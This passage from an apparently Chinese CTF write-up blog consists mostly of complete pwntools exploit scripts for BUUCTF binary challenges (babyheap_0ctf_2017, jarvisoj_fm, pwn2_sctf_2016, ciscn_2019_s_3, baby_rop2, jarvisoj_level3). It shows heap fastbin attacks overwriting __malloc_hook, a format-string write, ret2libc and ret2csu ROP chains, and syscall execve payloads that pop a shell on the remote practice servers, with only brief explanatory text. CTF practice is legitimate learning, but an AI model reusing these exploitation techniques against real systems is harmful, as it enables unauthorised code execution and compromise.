class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25446</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">b&#x27;/home/weedyssr/PycharmProjects/ctf/buu-libc/buu-16-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># method1</span></span><br><span class="line"><span class="string">add(0x18) #0</span></span><br><span class="line"><span class="string">add(0x18) #1</span></span><br><span class="line"><span class="string">add(0x68) #2</span></span><br><span class="line"><span class="string">add(0x68) #3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(0,b&#x27;a&#x27;*0x18 + p64(0x91))</span></span><br><span class="line"><span class="string">free(1)</span></span><br><span class="line"><span class="string">add(0x18) #1</span></span><br><span class="line"><span class="string">show(2)</span></span><br><span class="line"><span class="string">fd = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">print(&quot;fd: &quot; + hex(fd))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__malloc_hook_addr = fd - 0x68</span></span><br><span class="line"><span class="string">libcbase = __malloc_hook_addr - libc.symbols[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;libcbase: &quot; + hex(libcbase))</span></span><br><span class="line"><span class="string">one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line"><span class="string">free(2)</span></span><br><span class="line"><span class="string">edit(1, b&#x27;a&#x27;*0x18 + p64(0x71) + p64(__malloc_hook_addr-0x23))</span></span><br><span class="line"><span class="string">add(0x68)</span></span><br><span class="line"><span class="string">add(0x68)</span></span><br><span class="line"><span class="string">edit(4, b&#x27;a&#x27;*0x13 + p64(libcbase + one_gadget[1]))</span></span><br><span class="line"><span class="string">add(0x10)</span></span><br><span class="line"><span class="string">#gdb.attach(io)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># method2,choose one is ok</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">print(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + <span class="number">0x3c4aed</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">edit(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29414</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./jarvisoj_fm&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./jarvisoj_fm&#x27;</span>)</span><br><span class="line">addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(addr) + <span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line"><span class="comment">#context(os=&quot;linux&quot;,arch=&quot;i386&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25126</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/weedyssr/PycharmProjects/ctf/buu-libc/buu-16-32.so&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bytes of data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>) + p32(printf_plt) + p32(main_addr) + p32(__libc_start_main_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">__libc_start_main_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;__libc_start_main_addr: &quot;</span> + <span class="built_in">hex</span>(__libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">libcbase = __libc_start_main_addr - <span class="number">0x18540</span></span><br><span class="line">print(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="comment">#str_bin_sh = libc.search(b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="comment">#system = libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">str_bin_sh = <span class="number">0x15902B</span></span><br><span class="line">system  = <span class="number">0x3A940</span></span><br><span class="line">print(<span class="built_in">hex</span>(str_bin_sh) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bytes of data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>) + p32(libcbase + system) + p32(main_addr) + p32(libcbase + str_bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>参考<a href="https://blog.csdn.net/qq_38154820/article/details/106330212">ctf中关于syscall系统调用的简单分析</a></p><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><p>传参方式：首先将系统调用号传入 eax，然后将参数从左到右依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器<br>调用号：sys_read 的调用号为 3 sys_write 的调用号为 4<br>调用方式: 使用 int 80h 中断进行系统调用</p><h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><p>传参方式：首先将系统调用号传入 rax，然后将参数从左到右依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器<br>调用号：sys_read 的调用号为  0  sys_write 的调用号 为 1<br>       stub_execve 的调用号为 59   stub_rt_sigreturn 的调用号 为 15<br>调用方式: 使用 syscall 进行系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;ciscn_2019_s_3&#x27;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28526</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/weedyssr/PycharmProjects/ctf/buu-libc/buu-18-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&#x27;vuln&#x27;</span>] <span class="comment"># 这里我使用main函数地址打不通，换了一个</span></span><br><span class="line">syscall = <span class="number">0x00400517</span></span><br><span class="line">mov_rax_59_ret = <span class="number">0x04004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x40059A</span>    <span class="comment">#rsi=r14    rdx=r13</span></span><br><span class="line">mov_rdx_r13 = <span class="number">0x0400580</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr = u64(io.recv(<span class="number">8</span>)) - <span class="number">280</span></span><br><span class="line">print(<span class="string">&quot;bin_sh_addr: &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"><span class="comment"># print(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr+0x50))</span></span><br><span class="line"><span class="comment"># print(p64(bin_sh_addr+0x50))</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(bin_sh_addr+<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_r13) + p64(mov_rax_59_ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(syscall)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>参考<a href="https://blog.csdn.net/mcmuyanga/article/details/108918335">[BUUCTF]PWN——[HarekazeCTF2019]baby_rop2</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;HarekazeCTF2019baby_rop2&#x27;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28933</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">str_addr = <span class="number">0x0000000000400770</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400731</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(str_addr) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="number">0</span>) + p64(printf_plt) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;read_addr: &#x27;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">read_offset = <span class="number">0xf7250</span></span><br><span class="line">str_bin_sh_offset = <span class="number">0x18cd57</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">write_offset = <span class="number">0xf72b0</span></span><br><span class="line">libcbase = read_addr - read_offset</span><br><span class="line"></span><br><span class="line">onegadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*0x28 + p64(libcbase + onegadget[0]) #可以打通</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(str_bin_sh_offset + libcbase) + p64(system_offset + libcbase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>打通了，又没找到flag？？？</p><h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>不要用体中的libc，用buu链接-资源里的那个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;jarvisoj_level3&#x27;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25853</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./buu-16-32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;write_addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">str_bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">write_offset = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - write_offset</span><br><span class="line">print(<span class="string">&quot;write_offset: &quot;</span> + <span class="built_in">hex</span>(write_offset))</span><br><span class="line">print(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(libcbase + system_offset) + p32(<span class="number">0</span>) + p32(libcbase + str_bin_sh_offset)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>参考<a href="https://www.cnblogs.com/remon535/p/13507217.html">pwn-ciscn_2019_es_2(栈迁移)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;ciscn_2019_es_2&#x27;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26529</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./buu-18-32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hack_addr = elf.symbols[<span class="string">&#x27;hack&#x27;</span>]</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret_aeer = <span class="number">0x8048562</span></span><br><span class="line"></span><br><span class="line">payload = 